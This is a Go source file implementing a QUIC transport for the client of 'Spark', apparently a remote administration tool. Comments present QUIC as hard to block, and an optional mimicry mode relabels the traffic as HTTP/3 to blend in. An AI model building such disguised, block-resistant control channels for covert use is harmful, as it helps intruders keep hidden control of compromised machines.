package transport

import (
	"Spark/client/common"
	"Spark/modules"
	"Spark/utils"
	"context"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
)

// QUICTransport implements QUIC (Quick UDP Internet Connections) transport
// QUIC is a modern, encrypted, multiplexed transport protocol built on UDP
// Provides better performance and is harder to block than TCP-based protocols
type QUICTransport struct {
	conn        quic.Connection
	stream      quic.Stream
	secret      []byte
	ctx         context.Context
	cancel      context.CancelFunc
	sendQueue   chan *modules.Packet
	recvQueue   chan *modules.Packet
	mu          sync.Mutex
	connected   bool
}

// NewQUICTransport creates a new QUIC transport
func NewQUICTransport() *QUICTransport {
	return &QUICTransport{
		sendQueue: make(chan *modules.Packet, 100),
		recvQueue: make(chan *modules.Packet, 100),
	}
}

// Name returns the transport name
func (t *QUICTransport) Name() string {
	return "quic"
}

// Priority returns the priority level
func (t *QUICTransport) Priority() int {
	return 20 // Higher priority than long polling, lower than WebSocket
}

// IsAvailable checks if QUIC is available
func (t *QUICTransport) IsAvailable(ctx context.Context) bool {
	// QUIC requires UDP, which is usually available
	// But some networks block all UDP traffic
	return true
}

// Connect establishes a QUIC connection
func (t *QUICTransport) Connect(ctx context.Context, cfg *Config) (*common.Conn, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	// Parse server address
	addr, err := t.parseAddress(cfg.ServerURL, cfg.QUICPort)
	if err != nil {
		return nil, fmt.Errorf("invalid server address: %w", err)
	}

	// Create TLS config for QUIC
	tlsConf := &tls.Config{
		InsecureSkipVerify: cfg.InsecureSkipVerify,
		NextProtos:         []string{"spark-quic", "h3"}, // ALPN
		MinVersion:         tls.VersionTLS13, // QUIC requires TLS 1.3
	}

	// Apply protocol mimicry
	if cfg.Mimicry != nil && cfg.Mimicry.Enabled {
		// Mimic HTTP/3 traffic
		tlsConf.NextProtos = []string{"h3", "h3-29", "h3-28", "h3-27"}
	}

	// QUIC config
	quicConf := &quic.Config{
		MaxIdleTimeout:  30 * time.Second,
		KeepAlivePeriod: 10 * time.Second,
		EnableDatagrams: true, // Enable unreliable datagrams for low-latency data
	}

	// Establish QUIC connection
	t.conn, err = quic.DialAddr(ctx, addr, tlsConf, quicConf)
	if err != nil {
		// Check if blocked (connection refused, timeout, etc.)
		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "refused") {
			return nil, fmt.Errorf("%w: %v", ErrTransportBlocked, err)
		}
		return nil, fmt.Errorf("QUIC dial failed: %w", err)
	}

	// Open bidirectional stream for communication
	t.stream, err = t.conn.OpenStreamSync(ctx)
	if err != nil {
		t.conn.CloseWithError(0, "failed to open stream")
		return nil, fmt.Errorf("failed to open QUIC stream: %w", err)
	}

	// Perform handshake to get secret
	secret, err := t.handshake(ctx, cfg)
	if err != nil {
		t.conn.CloseWithError(0, "handshake failed")
		return nil, fmt.Errorf("QUIC handshake failed: %w", err)
	}

	t.secret = secret
	t.ctx, t.cancel = context.WithCancel(context.Background())
	t.connected = true

	// Start read loop
	go t.readLoop()

	// Start send loop
	go t.sendLoop()

	// Create connection wrapper
	return t.createConnWrapper(), nil
}

// parseAddress extracts host and port from server URL
func (t *QUICTransport) parseAddress(serverURL string, quicPort int) (string, error) {
	u, err := url.Parse(serverURL)
	if err != nil {
		return "", err
	}

	host := u.Hostname()
	if host == "" {
		return "", errors.New("no host in server URL")
	}

	// Use explicit QUIC port if specified, otherwise use port from URL or default
	port := quicPort
	if port == 0 {
		urlPort := u.Port()
		if urlPort != "" {
			port = 0 // Will be parsed from URL
		} else {
			port = 443 // Default QUIC port
		}
	}

	if port == 0 {
		return fmt.Sprintf("%s:%s", host, u.Port()), nil
	}

	return fmt.Sprintf("%s:%d", host, port), nil
}

// handshake performs initial handshake over QUIC stream
func (t *QUICTransport) handshake(ctx context.Context, cfg *Config) ([]byte, error) {
	// Send handshake message
	handshake := map[string]string{
		"type": "handshake",
		"uuid": cfg.UUID,
		"key":  cfg.Key,
	}

	data, err := json.Marshal(handshake)
	if err != nil {
		return nil, err
	}

	// Write handshake
	if _, err := t.stream.Write(data); err != nil {
		return nil, err
	}

	// Read response with timeout
	t.stream.SetReadDeadline(time.Now().Add(5 * time.Second))
	defer t.stream.SetReadDeadline(time.Time{})

	// Read response length (4 bytes)
	buf := make([]byte, 4096)
	n, err := t.stream.Read(buf)
	if err != nil {
		return nil, err
	}

	// Parse response
	var response map[string]string
	if err := json.Unmarshal(buf[:n], &response); err != nil {
		return nil, err
	}

	secretHex, ok := response["secret"]
	if !ok {
		return nil, errors.New("no secret in handshake response")
	}

	secret, err := hex.DecodeString(secretHex)
	if err != nil {
		return nil, fmt.Errorf("invalid secret: %w", err)
	}

	return secret, nil
}

// readLoop continuously reads messages from QUIC stream
func (t *QUICTransport) readLoop() {
	buf := make([]byte, 65536) // 64KB buffer

	for {
		select {
		case <-t.ctx.Done():
			return
		default:
		}

		// Read with timeout
		t.stream.SetReadDeadline(time.Now().Add(90 * time.Second))
		n, err := t.stream.Read(buf)
		t.stream.SetReadDeadline(time.Time{})

		if err != nil {
			if err == io.EOF || errors.Is(err, quic.Err0RTTRejected) {
				return
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if n == 0 {
			continue
		}

		// Decrypt
		data, err := utils.Decrypt(buf[:n], t.secret)
		if err != nil {
			continue
		}

		// Unmarshal
		var msg modules.Packet
		if err := json.Unmarshal(data, &msg); err != nil {
			continue
		}

		// Queue message
		select {
		case t.recvQueue <- &msg:
		case <-t.ctx.Done():
			return
		}
	}
}

// sendLoop sends queued messages over QUIC stream
func (t *QUICTransport) sendLoop() {
	for {
		select {
		case <-t.ctx.Done():
			return
		case msg := <-t.sendQueue:
			if err := t.send(msg); err != nil {
				// Re-queue on failure
				select {
				case t.sendQueue <- msg:
				default:
				}
				time.Sleep(100 * time.Millisecond)
			}
		}
	}
}

// send sends a single message over QUIC stream
func (t *QUICTransport) send(msg *modules.Packet) error {
	// Marshal
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	// Encrypt
	encData, err := utils.Encrypt(data, t.secret)
	if err != nil {
		return err
	}

	// Write to stream with timeout
	t.stream.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer t.stream.SetWriteDeadline(time.Time{})

	_, err = t.stream.Write(encData)
	return err
}

// createConnWrapper creates a common.Conn wrapper for QUIC
func (t *QUICTransport) createConnWrapper() *common.Conn {
	adapter := &quicAdapter{
		transport: t,
	}
	return common.CreateConnFromAdapter(adapter, t.secret)
}

// Close closes the QUIC connection
func (t *QUICTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if !t.connected {
		return nil
	}

	t.connected = false
	if t.cancel != nil {
		t.cancel()
	}

	if t.stream != nil {
		t.stream.Close()
	}

	if t.conn != nil {
		t.conn.CloseWithError(0, "client disconnect")
	}

	return nil
}

// quicAdapter adapts QUIC to WebSocket-like interface
type quicAdapter struct {
	transport *QUICTransport
}
